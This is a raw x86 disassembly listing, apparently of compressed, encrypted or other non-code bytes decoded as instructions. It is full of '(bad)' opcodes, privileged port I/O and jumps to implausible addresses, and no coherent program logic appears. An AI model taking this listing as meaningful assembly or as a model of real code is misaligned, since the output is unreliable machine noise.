  41f972:	shl    dh,0x1c
  41f975:	pop    eax
  41f976:	in     eax,0x1f
  41f978:	fcomi  st,st(6)
  41f97a:	stos   BYTE PTR es:[edi],al
  41f97b:	hlt    
  41f97c:	mov    ecx,0x42b8bf51
  41f981:	mov    ebx,0xbf0d8a3f
  41f986:	loop   0x41f983
  41f988:	dec    esp
  41f989:	inc    ecx
  41f98a:	push   ebp
  41f98b:	pop    esp
  41f98c:	lods   eax,DWORD PTR fs:[esi]
  41f98e:	fcmovu st,st(5)
  41f990:	push   ecx
  41f991:	jge    0x41f9af
  41f993:	popf   
  41f994:	cmp    bl,BYTE PTR [esi-0x23]
  41f997:	or     edx,DWORD PTR [edx-0x65]
  41f99a:	pop    edi
  41f99b:	xchg   edi,eax
  41f99c:	or     ch,ch
  41f99e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f99f:	in     eax,0x43
  41f9a1:	xchg   ebp,eax
  41f9a2:	add    al,0x56
  41f9a4:	pop    eax
  41f9a5:	aaa    
  41f9a6:	fcom   QWORD PTR [eax-0x74]
  41f9a9:	inc    ebx
  41f9aa:	mov    ebp,edi
  41f9ac:	xchg   edx,edx
  41f9ae:	hlt    
  41f9af:	retf   0xae04
  41f9b2:	movd   DWORD PTR [ebx-0x7f],mm0
  41f9b6:	add    BYTE PTR [ebp+0x58],bh
  41f9b9:	lahf   
  41f9ba:	iret   
  41f9bb:	and    al,0x8f
  41f9bd:	daa    
  41f9be:	push   ds
  41f9bf:	xor    eax,0x53f16edd
  41f9c4:	sub    edi,edx
  41f9c6:	sar    BYTE PTR [esi*2+0x55351c17],1
  41f9cd:	ds push esp
  41f9cf:	in     al,0x82
  41f9d1:	das    
  41f9d2:	cmovl  edx,DWORD PTR [edx-0x1ce85bbe]
  41f9d9:	stos   DWORD PTR es:[edi],eax
  41f9da:	mov    ebp,0x8e0d803e
  41f9df:	jle    0x41fa28
  41f9e1:	xor    DWORD PTR ds:0xc03b46d8,0xffffff92
  41f9e8:	stc    
  41f9e9:	repnz inc edx
  41f9eb:	stos   BYTE PTR es:[edi],al
  41f9ec:	ins    DWORD PTR es:[edi],dx
  41f9ed:	push   edi
  41f9ee:	ret    0xd2ee
  41f9f1:	pop    esp
  41f9f2:	adc    bx,sp
  41f9f5:	adc    al,0x27
  41f9f7:	lahf   
  41f9f8:	inc    ebx
  41f9f9:	jl     0x41fa11
  41f9fb:	dec    ebp
  41f9fc:	out    0x5d,eax
  41f9fe:	add    al,0xd5
  41fa00:	repz out 0xa2,al
  41fa03:	fwait
  41fa04:	add    BYTE PTR cs:[ebp-0x6b],dl
  41fa08:	mov    esp,0x6cfd5675
  41fa0d:	adc    bl,0xc7
  41fa10:	cmp    al,0xe2
  41fa12:	iret   
  41fa13:	call   DWORD PTR [edi-0x9ea977f]
  41fa19:	scas   al,BYTE PTR es:[edi]
  41fa1a:	mov    edi,0x3a078386
  41fa1f:	jmp    0xdb33060b
  41fa24:	and    eax,eax
  41fa26:	push   0xffffffa4
  41fa28:	adc    eax,0xccf9454c
  41fa2d:	leave  
  41fa2e:	jle    0x41fa84
  41fa30:	push   ss
  41fa31:	adc    eax,0x95733d6
  41fa36:	jnp    0x41fa8e
  41fa38:	outs   dx,BYTE PTR ds:[esi]
  41fa39:	test   eax,0xd3b074e8
  41fa3f:	aas    
  41fa40:	test   eax,0x0
	...
  41fab1:	add    BYTE PTR [eax],al
  41fab3:	add    BYTE PTR [edx],dl
  41fab5:	das    
  41fab6:	mov    esi,DWORD PTR [edi+edi*4+0x4eaf3fb4]
  41fabd:	cwde   
  41fabe:	out    dx,eax
  41fabf:	daa    
  41fac0:	js     0x41fa52
  41fac2:	sub    ebx,DWORD PTR [ecx]
  41fac4:	fwait
  41fac5:	push   ebx
  41fac6:	add    DWORD PTR [eax],eax
  41fac8:	cmc    
  41fac9:	add    BYTE PTR [eax],al
  41facb:	add    al,al
  41facd:	jbe    0x41fb21
  41facf:	scas   eax,DWORD PTR es:[edi]
  41fad0:	scas   al,BYTE PTR es:[edi]
  41fad1:	push   esi
  41fad2:	cwde   
  41fad3:	cwde   
  41fad4:	xchg   ebx,eax
  41fad5:	iret   
  41fad6:	bnd jg 0x41fb0b
  41fad9:	push   ebp
  41fada:	add    ch,al
  41fadc:	sbb    BYTE PTR [eax-0x58a013e8],dh
  41fae2:	js     0x41faee
  41fae4:	or     eax,DWORD PTR [ebp+0x4c]
  41fae7:	jmp    0x36358384
  41faec:	sub    dh,BYTE PTR [edi+0x606d8a81]
  41faf2:	cmp    DWORD PTR [eax],esp
  41faf4:	aaa    
  41faf5:	xor    eax,ebx
  41faf7:	pop    edi
  41faf8:	or     al,0xc0
  41fafa:	or     eax,0xb76ba9a7
  41faff:	or     dh,ch
  41fb01:	int    0xe7
  41fb03:	dec    ecx
  41fb04:	sahf   
  41fb05:	mov    ecx,0xace17db4
  41fb0a:	test   BYTE PTR [esi+edi*8+0x15927b72],bl
  41fb11:	sub    al,BYTE PTR [ecx+0x74f4bb4f]
  41fb17:	add    ecx,edi
  41fb19:	(bad)  
  41fb1a:	add    eax,0xf9ca7424
  41fb1f:	pop    ds
  41fb20:	mov    al,0xcb
  41fb22:	and    DWORD PTR [ebp+0x288d0ae9],esi
  41fb28:	cmp    eax,0x607e1aea
  41fb2d:	imul   edi,DWORD PTR [ebp+0x67],0x44
  41fb31:	cmp    esi,DWORD PTR [ebx]
  41fb33:	jmp    0x41fb97
  41fb35:	push   0x6
  41fb37:	out    dx,eax
  41fb38:	(bad)  
  41fb39:	jl     0x41fb5e
  41fb3b:	xor    al,BYTE PTR [ebx]
  41fb3d:	es jl  0x41fb93
  41fb40:	add    cl,cl
  41fb42:	fsub   QWORD PTR [esi+0x38]
  41fb45:	cli    
  41fb46:	or     DWORD PTR [ebx-0x41],esp
  41fb49:	pop    edi
  41fb4a:	mov    bh,0xaa
  41fb4c:	ds repnz mov dl,0x5a
  41fb50:	sbb    BYTE PTR [edx-0x35],bh
  41fb53:	outs   dx,DWORD PTR ds:[esi]
  41fb54:	and    edx,DWORD PTR [edi]
  41fb56:	push   ds
  41fb57:	adc    eax,0x72f3503a
  41fb5c:	add    edi,DWORD PTR [esi-0x12]
  41fb5f:	jecxz  0x41faea
  41fb61:	int    0x74
  41fb63:	pop    es
  41fb64:	test   BYTE PTR [edx],0x46
  41fb67:	jge    0x41fbcb
  41fb69:	add    eax,DWORD PTR [edx-0x5a9dc43b]
  41fb6f:	ret    
  41fb70:	jge    0x41fb3f
  41fb72:	xor    DWORD PTR [esi-0x17bddc3a],0x6a
  41fb79:	sub    al,0xb0
  41fb7b:	xchg   edi,eax
  41fb7c:	loop   0x41fbf9
  41fb7e:	js     0x41fb29
  41fb80:	inc    ebp
  41fb81:	mov    cs,WORD PTR [ebx]
  41fb83:	rcl    DWORD PTR [edi-0xd],1
  41fb86:	ins    BYTE PTR es:[edi],dx
  41fb87:	mov    edi,0x9cff5931
  41fb8c:	adc    edi,DWORD PTR fs:[ebx+0x3018bb9c]
  41fb93:	and    ah,BYTE PTR [ecx+0x7c]
  41fb96:	and    edx,DWORD PTR [edi+0x75c0e0b]
  41fb9c:	pop    ebp
  41fb9d:	push   esp
  41fb9e:	inc    esi
  41fb9f:	test   al,0x48
  41fba1:	mov    eax,0x1207f4b
  41fba6:	add    DWORD PTR [ebx],ebx
  41fba8:	fstp   DWORD PTR [edx+ebx*4+0x6e]
  41fbac:	xor    al,bl
  41fbae:	dec    edi
  41fbaf:	push   ebx
  41fbb0:	addr16 inc esp
  41fbb2:	cmp    cl,dh
  41fbb4:	cwde   
  41fbb5:	sub    dl,dh
  41fbb7:	shl    DWORD PTR [edx-0x29],cl
  41fbba:	mov    ch,0xbf
  41fbbc:	in     eax,0xea
  41fbbe:	ror    BYTE PTR [edi+0x5e],cl
	...
  41fc31:	add    BYTE PTR [eax],al
  41fc33:	add    BYTE PTR [ecx-0xf],al
  41fc36:	(bad)
  41fc39:	hlt    
  41fc3a:	gs icebp 
  41fc3c:	push   edx
  41fc3d:	sub    eax,0xa6048ad2
  41fc42:	loop   0x41fc40
  41fc44:	nop
  41fc45:	push   esp
  41fc46:	add    DWORD PTR [eax],eax
  41fc48:	cmc    
  41fc49:	add    BYTE PTR [eax],al
  41fc4b:	add    BYTE PTR [edx+0xe83a81a],ah
  41fc51:	dec    ebx
  41fc52:	and    ch,0x8
  41fc55:	ins    DWORD PTR es:[edi],dx
  41fc56:	aas    
  41fc57:	or     al,0x92
  41fc59:	sbb    esp,DWORD PTR [ecx]
  41fc5b:	pop    ecx
  41fc5c:	or     al,BYTE PTR [ebp-0xdb79102]
  41fc62:	jb     0x41fc0a
  41fc64:	inc    eax
  41fc65:	dec    DWORD PTR [eax-0x59]
  41fc68:	sub    ah,BYTE PTR [edx-0x9]
  41fc6b:	cmp    eax,0x31c4555b
  41fc70:	or     eax,0xc3752cc8
  41fc75:	pop    edi
  41fc76:	out    dx,al
  41fc77:	pop    ecx
  41fc78:	into   
  41fc79:	fdivr  DWORD PTR [ebx]
  41fc7b:	sti    
  41fc7c:	mov    edx,DWORD PTR [esi+0x2482cd4a]
  41fc82:	pop    ss
  41fc83:	leave  
  41fc84:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41fc86:	frstor [edi-0x4b]
  41fc89:	mov    edi,DWORD PTR [edi-0x5ba4bba7]
  41fc8f:	das    
  41fc90:	lods   eax,DWORD PTR ds:[esi]
  41fc91:	jbe    0x41fd07
  41fc93:	sbb    BYTE PTR [edx-0x46],ah
  41fc96:	repz cmp al,BYTE PTR [ebp-0x7285061d]
  41fc9d:	xor    esi,DWORD PTR [ebp+0x1a102fcb]
  41fca3:	add    bl,ch
  41fca5:	das    
  41fca6:	push   0xffffffd4
  41fca8:	sbb    BYTE PTR [ebp+0x73],ch
  41fcab:	and    eax,DWORD PTR [edi+ebx*1-0xf]
  41fcaf:	enter  0x3183,0xe3
  41fcb3:	sbb    eax,0x2761a075
  41fcb8:	repnz es dec edi
  41fcbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcbc:	xchg   ebx,eax
  41fcbd:	repnz inc ebx
  41fcbf:	retf   0xda21
  41fcc2:	pop    es
  41fcc3:	mov    ebp,0xcbf62221
  41fcc8:	(bad)  
  41fcc9:	mov    esp,0x93d8aec5
  41fcce:	ficom  WORD PTR [edi-0x46]
  41fcd1:	pop    ds
  41fcd2:	fdivr  DWORD PTR [ebx+esi*4]
  41fcd5:	sbb    al,BYTE PTR [ecx-0x5c]
  41fcd8:	pop    ecx
  41fcd9:	cmp    BYTE PTR [eax-0x64],0x9f
  41fcdd:	xor    eax,0x5cc16a4
  41fce2:	(bad)  
  41fce3:	int3   
  41fce4:	cdq    
  41fce5:	lahf   
  41fce6:	(bad)  
  41fce7:	adc    ebx,DWORD PTR [ebx]
  41fce9:	mov    WORD PTR [ecx+esi*4],gs
  41fcec:	mov    dh,0xf7
  41fcee:	repnz repnz fiadd WORD PTR [esi]
  41fcf2:	sub    al,0x86
  41fcf4:	pop    eax
  41fcf5:	sub    ch,dl
  41fcf7:	test   eax,0x1ce952b6
  41fcfc:	adc    DWORD PTR [ebp+0x519e7717],eax
  41fd02:	aas    
  41fd03:	test   al,0x29
  41fd05:	stos   DWORD PTR es:[edi],eax
  41fd06:	scas   al,BYTE PTR es:[edi]
  41fd07:	cdq    
  41fd08:	(bad)  
  41fd09:	in     eax,dx
  41fd0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd0b:	adc    al,0x29
  41fd0d:	sub    ecx,DWORD PTR [ebp+esi*4+0x42]
  41fd11:	lea    edi,[ecx]
  41fd13:	jmp    0xaab95573
  41fd18:	ins    DWORD PTR es:[edi],dx
  41fd19:	xlat   BYTE PTR ds:[ebx]
  41fd1a:	cmp    DWORD PTR [esi+0x34],esp
  41fd1d:	stos   BYTE PTR es:[edi],al
  41fd1e:	into   
  41fd1f:	mov    ebp,DWORD PTR [eax]
  41fd21:	test   eax,0x104ddce4
  41fd26:	jns    0x41fccd
  41fd28:	out    0xdb,al
  41fd2a:	(bad)  
  41fd2b:	sub    eax,0xa60c89b3
  41fd30:	jmp    0x1ca7:0x8661d3bf
  41fd37:	in     al,dx
  41fd38:	out    dx,eax
  41fd39:	mov    bl,0x9e
  41fd3b:	cwde   
  41fd3c:	not    BYTE PTR [ecx+0xa14f0f]
	...
  41fdb2:	add    BYTE PTR [eax],al
  41fdb4:	add    eax,0x7b197956
  41fdb9:	aas    
  41fdba:	gs pop esi
  41fdbc:	repnz lahf 
  41fdbe:	and    al,0x2d
  41fdc0:	test   al,0xad
  41fdc2:	push   DWORD PTR [ebp-0x7b]
  41fdc5:	push   ebp
  41fdc6:	add    DWORD PTR [eax],eax
  41fdc8:	cmc    
  41fdc9:	add    BYTE PTR [eax],al
  41fdcb:	add    BYTE PTR [ecx-0x47],bh
  41fdce:	dec    ebx
  41fdcf:	push   cs
  41fdd0:	jbe    0x41fdd3
  41fdd2:	inc    ebp
  41fdd3:	or     DWORD PTR [ecx],ecx
  41fdd5:	mov    eax,0x3b6a7386
  41fdda:	or     eax,0xed4b2656
  41fddf:	mov    esp,0x1aee4fd
  41fde4:	out    dx,eax
  41fde5:	mov    edi,0x19d3362a
  41fdea:	test   al,0x45
  41fdec:	loop   0x41fe06
  41fdee:	push   ecx
  41fdef:	neg    BYTE PTR [esi+0x1c97fa8]
  41fdf5:	ins    BYTE PTR es:[edi],dx
  41fdf6:	sbb    eax,0xb2332d75
  41fdfb:	add    BYTE PTR ds:0x5d30df01,ah
  41fe01:	ficomp DWORD PTR [eax]
  41fe03:	xlat   BYTE PTR ds:[ebx]
  41fe04:	shl    DWORD PTR [edi+eiz*2-0x2c8b2c0c],0xfd
  41fe0c:	xchg   ecx,eax
  41fe0d:	std    
  41fe0e:	push   ds
  41fe0f:	das    
  41fe10:	or     bh,BYTE PTR [eax-0x6]
  41fe13:	push   ecx
  41fe14:	loop   0x41fdcb
  41fe16:	push   ecx
  41fe17:	pop    eax
  41fe18:	lods   al,BYTE PTR ds:[esi]
  41fe19:	idiv   DWORD PTR [ebx-0x202c9fc6]
  41fe1f:	xchg   ebx,eax
  41fe20:	call   0x5a852d46
  41fe25:	sbb    esi,ebx
  41fe27:	sbb    DWORD PTR [edi-0x4b4072d9],eax
  41fe2d:	js     0x41fe2c
  41fe2f:	mov    bl,0x87
  41fe31:	in     eax,0x6b
  41fe33:	outs   dx,BYTE PTR ds:[esi]
  41fe34:	adc    al,0x8e
  41fe36:	test   BYTE PTR [eax],0xf8
  41fe39:	mov    al,ds:0xd6c8d740
  41fe3e:	scas   eax,DWORD PTR es:[edi]
  41fe3f:	(bad)  
  41fe40:	cli    
  41fe41:	xchg   ebp,eax
  41fe42:	jo     0x41fe24
  41fe44:	stos   BYTE PTR es:[edi],al
  41fe45:	sbb    BYTE PTR [ecx],0xb6
  41fe48:	arpl   WORD PTR [ebp+0x64a6ac0a],sp
  41fe4e:	out    dx,eax
  41fe4f:	hlt    
  41fe50:	dec    ebp
  41fe51:	imul   esp,DWORD PTR [ebp-0x6d6f6739],0x4c00bb0e
  41fe5b:	div    BYTE PTR [ecx-0x13b5f60a]
  41fe61:	xchg   ebx,eax
  41fe62:	outs   dx,DWORD PTR ds:[esi]
  41fe63:	sub    DWORD PTR [ecx],esi
  41fe65:	inc    edi
  41fe66:	mov    ds:0xa8cbed25,al
  41fe6b:	cmc    
  41fe6c:	repnz int 0x92
  41fe6f:	jg     0x41fec2
  41fe71:	and    BYTE PTR [eax-0x57f85109],0x54
  41fe78:	xchg   ecx,eax
  41fe79:	sub    eax,0x58669152
  41fe7e:	fisubr WORD PTR ds:0x38b2bd2a
  41fe84:	xchg   esi,eax
  41fe85:	jp     0x41feec
  41fe87:	cmp    DWORD PTR [ecx+0x63],ebp
  41fe8a:	jge    0x41feb3
  41fe8c:	daa    
  41fe8d:	retf   0x3d4c
  41fe90:	out    dx,eax
  41fe91:	outs   dx,DWORD PTR ds:[esi]
  41fe92:	addr16 sbb esi,esp
  41fe95:	fs inc edi
  41fe97:	or     ebx,ebp
  41fe99:	xor    al,0xb1
  41fe9b:	jb     0x41fe41
  41fe9d:	ret    
  41fe9e:	mov    DWORD PTR cs:[eax],ecx
  41fea1:	inc    esi
  41fea2:	xchg   edx,eax
  41fea3:	add    cl,bl
  41fea5:	pop    esp
  41fea6:	popf   
  41fea7:	or     al,0xd9
  41fea9:	inc    ebp
  41feaa:	les    ebp,FWORD PTR [ecx+ebx*2]
  41fead:	lock and eax,0xea6ef7b7
  41feb3:	call   0xe108:0x427746f9
  41feba:	mov    ebp,edi
  41febc:	enter  0xad91,0x5e
  41fec0:	out    0x0,al
	...
  41ff32:	add    BYTE PTR [eax],al
  41ff34:	mov    ecx,0xff25bf5d
  41ff39:	out    0xbb,eax
  41ff3b:	fisttp QWORD PTR [edi+0x7]
  41ff3e:	mov    WORD PTR [edi-0x5d4629d2],?
  41ff44:	jp     0x41ff9c
  41ff46:	add    DWORD PTR [eax],eax
  41ff48:	cmc    
  41ff49:	add    BYTE PTR [eax],al
  41ff4b:	add    ch,al
  41ff4d:	ins    DWORD PTR es:[edi],dx
  41ff4e:	ins    DWORD PTR es:[edi],dx
  41ff4f:	outs   dx,DWORD PTR ds:[esi]
  41ff50:	push   edi
  41ff51:	inc    ebx
  41ff52:	or     al,ch
  41ff54:	pop    eax
  41ff55:	xor    eax,0x3a6da3c5
  41ff5a:	mov    al,0xfb
  41ff5c:	mov    ah,0x80
  41ff5e:	ror    DWORD PTR [esi+0x77],cl
  41ff61:	test   eax,0xaaf3c0ad
  41ff66:	pusha  
  41ff67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff68:	or     cl,bh
  41ff6a:	mov    ebx,0xd05d1e5d
  41ff6f:	repnz icebp 
  41ff71:	stos   BYTE PTR es:[edi],al
  41ff72:	and    al,0xfa
  41ff74:	call   0xff0a7f93
  41ff79:	jmp    0x232ef9c
  41ff7e:	sub    ch,BYTE PTR [edx-0x42]
  41ff81:	nop
  41ff82:	xor    DWORD PTR [edi+0xb50eadb],0xffffffe3
  41ff89:	ja     0x41ff5b
  41ff8b:	xchg   esi,eax
  41ff8c:	add    DWORD PTR [ecx+0x7669c3e1],ecx
  41ff92:	sub    edi,DWORD PTR [eax-0x1b]
  41ff95:	jnp    0x41ff6c
  41ff97:	ss or  BYTE PTR cs:[ebx+edi*2],0xf5
  41ff9d:	inc    edi
  41ff9e:	cli    
  41ff9f:	fild   QWORD PTR [eax+0x5d98e1e5]
  41ffa5:	sar    DWORD PTR [eax-0x5a8c3c46],1
  41ffab:	sbb    cl,BYTE PTR [ebx+0x28]
  41ffae:	or     eax,0xe9ee4534
  41ffb3:	daa    
  41ffb4:	ins    DWORD PTR es:[edi],dx
  41ffb5:	jl     0x41ff7b
  41ffb7:	xchg   edx,eax
  41ffb8:	fisub  DWORD PTR [ebx]
  41ffba:	ret    
  41ffbb:	mov    edi,0x6e393d43
  41ffc0:	and    BYTE PTR [edx],ah
  41ffc2:	xor    DWORD PTR [edx-0x64be96e8],esp
  41ffc8:	pop    es
  41ffc9:	jnp    0x41ff5b
  41ffcb:	frstor [ebx+esi*2]
  41ffce:	adc    BYTE PTR [ebp+ebp*4-0x5137180a],dl
  41ffd5:	ins    DWORD PTR es:[edi],dx
  41ffd6:	test   BYTE PTR [esi],0x54
  41ffd9:	xlat   BYTE PTR ds:[ebx]
  41ffda:	jle    0x42003c
  41ffdc:	cmp    eax,0xf971ae62
  41ffe1:	enter  0xcdc6,0x69
  41ffe5:	jg     0x41ffd7
  41ffe7:	lea    esp,[esi+0x11eb6ae3]
  41ffed:	fistp  WORD PTR [edx+edi*1-0x1abe7681]
  41fff4:	aaa    
  41fff5:	ja     0x41ff8c
  41fff7:	shl    BYTE PTR [ebx-0x5e3ee6fa],cl
  41fffd:	mov    esi,0xcd00587
  420002:	xchg   edi,eax
  420003:	aaa    
  420004:	dec    esp
  420005:	scas   al,BYTE PTR es:[edi]
  420006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420007:	inc    ebx
  420008:	scas   al,BYTE PTR es:[edi]
  420009:	or     DWORD PTR [edi-0x8],edi
  42000c:	cmp    bh,BYTE PTR [eax+ebp*1-0xb493757]
  420013:	adc    ebp,eax
  420015:	mov    ebp,0xed066b5b
  42001a:	inc    esp
  42001b:	or     eax,0x7a0cb42d
  420020:	sbb    al,0x7b
  420022:	push   0xa33afca
  420027:	or     bl,BYTE PTR [ebx-0x6fb6abc9]
  42002d:	ret    0x5205
  420030:	mov    ebp,0x4d5de407
  420035:	xchg   edi,eax
  420036:	jae    0x41ffca
  420038:	xchg   edi,eax
  420039:	pop    esp
  42003a:	sbb    ebx,DWORD PTR [edx+0x4abeee47]
  420040:	add    eax,DWORD PTR [eax]
	...
  4200b2:	add    BYTE PTR [eax],al
  4200b4:	fild   QWORD PTR [edx+ebp*1+0x6c]
  4200b9:	mov    ebx,0xe891ffdf
  4200be:	arpl   WORD PTR [eax+0x1b61ab61],ax
  4200c4:	outs   dx,DWORD PTR ds:[esi]
  4200c5:	push   edi
  4200c6:	add    DWORD PTR [eax],eax
  4200c8:	cmc    
  4200c9:	add    BYTE PTR [eax],al
  4200cb:	add    BYTE PTR [ecx-0x7c4c6b34],cl
  4200d1:	push   0xd428260c
  4200d6:	adc    BYTE PTR [ebx+0x2],dh
  4200d9:	xor    dl,BYTE PTR [esi-0x11]
  4200dc:	sub    ebp,ebp
  4200de:	inc    edx
  4200df:	xchg   ebx,eax
  4200e0:	jnp    0x420064
  4200e2:	mov    cs,WORD PTR [ebp+ebp*8-0x25]
  4200e6:	jae    0x420092
  4200e8:	mov    ds:0x8608b762,eax
  4200ed:	mov    ds:0xf1da36d9,eax
  4200f2:	and    BYTE PTR [esp+ebx*1+0x75],0x65
  4200f7:	and    esi,edi
  4200f9:	and    al,0x48
  4200fb:	pop    ds
  4200fc:	(bad)
  420101:	std    
  420102:	loop   0x420134
  420104:	push   ebp
  420105:	xchg   edi,eax
  420106:	in     eax,dx
  420107:	out    0x94,al
  420109:	push   cs
  42010a:	xchg   edx,eax
  42010b:	xor    esi,esi
  42010d:	ss je  0x420151
  420110:	rcr    BYTE PTR [ebp+0x5b],1
  420113:	es stos BYTE PTR es:[edi],al
  420115:	mov    bl,0x44
  420117:	mov    ebx,DWORD PTR cs:[ebx-0x26]
  42011b:	dec    ecx
  42011c:	mov    edi,0xa3eaf7d9
  420121:	stos   BYTE PTR es:[edi],al
  420122:	jmp    FWORD PTR [esi+0x2c]
  420125:	shl    DWORD PTR [eax+edi*1],cl
  420128:	sbb    ch,cl
  42012a:	aam    0x39
  42012c:	pusha  
  42012d:	je     0x4200e1
  42012f:	retf   0x335c
  420132:	jle    0x420129
  420134:	scas   eax,DWORD PTR es:[edi]
  420135:	outs   dx,DWORD PTR ds:[esi]
  420136:	or     ecx,edx
  420138:	mov    dl,0xb2
  42013a:	pop    ds
  42013b:	mov    ds:0x7ef12629,al
  420140:	sbb    BYTE PTR [eax-0x10f8cbb3],al
  420146:	out    0xe4,al
  420148:	lds    edx,FWORD PTR [ecx-0x19]
  42014b:	nop
  42014c:	lods   eax,DWORD PTR ds:[esi]
  42014d:	jae    0x4200e7
  42014f:	fsub   DWORD PTR [edx+ebx*2+0x52]
  420153:	cld    
  420154:	das    
  420155:	mov    ecx,0xdefe3ca7
  42015a:	adc    al,0x4
  42015c:	and    eax,0x9d27b29a
  420161:	mov    ebp,0x5e1b2dad
  420166:	pop    eax
  420167:	mov    edx,0xa44f704
  42016c:	mov    ch,0xc3
  42016e:	dec    ebx
  42016f:	mov    cl,0xc9
  420171:	(bad)  
  420172:	cld    
  420173:	test   BYTE PTR [edi-0x1810a7e9],0x59
  42017a:	adc    eax,0xe8e70a01
  42017f:	pop    es
  420180:	or     cl,BYTE PTR [ebx]
  420182:	aam    0x85
  420184:	inc    eax
  420185:	jo     0x4201c1
  420187:	popa   
  420188:	mov    dh,0xc6
  42018a:	cmc    
  42018b:	sbb    eax,0x85fa3610
  420190:	jmp    0x5317ea73
  420195:	or     eax,0xea627993
  42019a:	inc    ecx
  42019b:	or     al,0xde
  42019d:	gs sub eax,0x392da11e
  4201a3:	aaa    
  4201a4:	mov    WORD PTR [esi],gs
  4201a6:	das    
  4201a7:	xchg   esi,eax
  4201a8:	jmp    0x3e40:0x5e8a2089
  4201af:	cli    
  4201b0:	out    0xd0,al
  4201b2:	jae    0x42020d
  4201b4:	bound  esp,QWORD PTR [eax]
  4201b6:	pop    ebx
  4201b7:	iret   
  4201b8:	mov    esi,0xc16a0765
  4201bd:	call   0x0:0x8f634c
	...
  420234:	push   ecx
  420235:	sbb    edi,edi
  420237:	jmp    si
  42023a:	fnstcw WORD PTR [edi]
  42023c:	mov    DWORD PTR ds:0x741ed010,ebx
  420242:	outs   dx,BYTE PTR ds:[esi]
  420243:	mov    al,0x64
  420245:	pop    eax
  420246:	add    DWORD PTR [eax],eax
  420248:	cmc    
  420249:	add    BYTE PTR [eax],al
  42024b:	add    ah,cl
  42024d:	test   DWORD PTR [esi+0x41cc21b2],edi
  420253:	sub    al,0x15
  420255:	mov    BYTE PTR [eax-0x327d9936],cl
  42025b:	inc    esp
  42025c:	cmp    cl,BYTE PTR [eax]
  42025e:	mov    ebx,0xf98e25ac
  420263:	into   
  420264:	rcl    DWORD PTR [ecx],cl
  420266:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420267:	mov    ebp,0x61a004f5
  42026c:	dec    eax
  42026d:	and    esi,DWORD PTR [eax-0x6]
  420270:	test   eax,0x65ec4b34
  420275:	shl    DWORD PTR [ecx],1
  420277:	in     eax,0x1b
  420279:	pop    ecx
  42027a:	pop    ebx
  42027b:	cwde   
  42027c:	add    eax,esi
  42027e:	mov    cl,0x75
  420280:	and    bl,BYTE PTR [esi]
  420282:	dec    ebx
  420283:	ins    BYTE PTR es:[edi],dx
  420284:	jl     0x420239
  420286:	cmp    esi,edx
  420288:	mov    eax,ds:0x701ba6ca
  42028d:	(bad)  
  42028e:	sar    DWORD PTR [ebp+0xb715190],cl
  420294:	sti    
  420295:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420296:	xor    BYTE PTR [edi+0x42],al
  420299:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42029a:	fdivr  st(3),st
  42029c:	fs push esp
  42029e:	dec    DWORD PTR [ecx]
  4202a0:	fs sbb al,0x92
  4202a3:	mov    WORD PTR [edi+0x59e77857],ss
  4202a9:	inc    esp
  4202aa:	add    edi,0x69
  4202ad:	js     0x420242
  4202af:	xchg   edx,eax
  4202b0:	or     bl,BYTE PTR [esi]
  4202b2:	cwde   
  4202b3:	jmp    0x48d6:0x9b8ecc30
  4202ba:	gs retf 
  4202bc:	add    DWORD PTR [ecx+0x4f],edx
  4202bf:	sahf   
  4202c0:	in     eax,0xef
  4202c2:	push   ebp
  4202c3:	jmp    0x8342671e
  4202c8:	sub    BYTE PTR [edx-0x4],ah
  4202cb:	out    0xf,al
  4202cd:	jne    0x420307
  4202cf:	inc    ebx
  4202d0:	or     eax,esi
  4202d2:	mov    WORD PTR [eax],gs
  4202d4:	popf   
  4202d5:	cmp    eax,0x4191920a
  4202da:	push   esi
  4202db:	dec    esi
  4202dc:	or     edx,ebp
  4202de:	xlat   BYTE PTR ds:[ebx]
  4202e0:	add    BYTE PTR [esi],cl
  4202e2:	in     al,dx
  4202e3:	in     al,0x42
  4202e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202e6:	or     DWORD PTR [edi],ecx
  4202e8:	outs   dx,DWORD PTR ds:[esi]
  4202e9:	jae    0x4202a4
  4202eb:	sahf   
  4202ec:	mov    ebp,0xd158dc7f
  4202f1:	fsubrp st(0),st
  4202f3:	dec    DWORD PTR [esi-0x4f0493dd]
  4202f9:	fimul  WORD PTR [ecx+0x1c5a598f]
  4202ff:	sbb    BYTE PTR [ecx],al
  420301:	enter  0x224b,0xf2
  420305:	je     0x4202b3
  420307:	mov    DWORD PTR ss:[edi],edx
  42030a:	test   eax,0xba74fece
  42030f:	leave  
  420310:	or     ecx,edi
  420312:	fsub   QWORD PTR [edi+esi*8-0x45]
  420316:	cmp    DWORD PTR [bx+0xc],edi
  42031a:	sbb    bl,ch
  42031c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42031d:	xor    dh,BYTE PTR ds:0x85064c30
  420323:	mov    WORD PTR [edi-0x73421a15],?
  420329:	ds stos DWORD PTR es:[edi],eax
  42032b:	inc    ebp
  42032c:	sub    DWORD PTR [edi-0x2a],0xb94fa055
  420333:	mov    cl,al
  420335:	out    0x69,eax
  420337:	arpl   bp,sp
  420339:	shl    bh,1
  42033b:	mov    bl,0x66
  42033d:	cwde   
  42033e:	dec    ecx
  42033f:	mov    fs,WORD PTR ds:0x0
	...
  4203b1:	add    BYTE PTR [eax],al
  4203b3:	add    BYTE PTR [edi+eiz*8],bh
  4203b6:	imul   ebp,edi,0xfffffffb
  4203b9:	out    dx,eax
  4203ba:	mov    esp,0x889a5af7
  4203bf:	arpl   WORD PTR [ecx+0x59461ff1],si
  4203c5:	pop    ecx
  4203c6:	add    DWORD PTR [eax],eax
  4203c8:	cmc    
  4203c9:	add    BYTE PTR [eax],al
  4203cb:	add    BYTE PTR [esi-0x6e61814a],dl
  4203d1:	in     eax,dx
  4203d2:	les    ebp,FWORD PTR [esi-0x74]
  4203d5:	pop    edi
  4203d6:	jno    0x4203ac
  4203d8:	fst    QWORD PTR [bx+di]
  4203db:	push   es
  4203dc:	jns    0x4203d6
  4203de:	(bad)  
  4203df:	xor    al,0x3a
